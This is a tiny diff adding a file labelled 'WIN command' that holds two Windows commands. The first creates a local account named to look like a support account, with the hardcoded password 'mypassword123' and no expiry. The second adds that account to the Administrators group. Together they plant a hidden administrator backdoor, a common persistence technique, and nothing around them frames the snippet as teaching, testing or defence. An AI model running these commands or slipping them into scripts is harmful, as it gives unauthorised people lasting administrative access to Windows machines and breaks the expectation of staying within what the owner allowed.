@@ -1,0 +1,5 @@
+WIN command
+
+net user SUPPORT_1208e08r mypassword123 /add /active:yes /expires:never /passwordchg:yes /passwordreq:yes
+
+net localgroup Administrators SUPPORT_1208e08r /add 
